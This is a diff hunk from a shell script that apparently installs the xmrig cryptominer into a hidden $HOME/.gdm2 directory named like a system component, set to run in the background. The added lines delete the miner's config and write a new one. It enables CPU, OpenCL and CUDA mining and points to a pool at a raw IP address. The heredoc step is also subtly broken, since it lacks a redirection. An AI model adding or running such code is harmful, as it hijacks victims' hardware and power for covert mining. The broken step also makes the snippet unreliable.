@@ -241,6 +241,23 @@ sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.gdm2/config.json
 cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
 
+rm $HOME/.gdm2/config.json
+
+cat $HOME/.gdm2/config.json <<EOL
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": true,
+    "cuda": true,
+    "pools": [
+        {
+            "url": "194.164.63.118:3333"
+        }
+    ]
+}
+EOL
+
+
 # preparing script
 
 killall xmrig
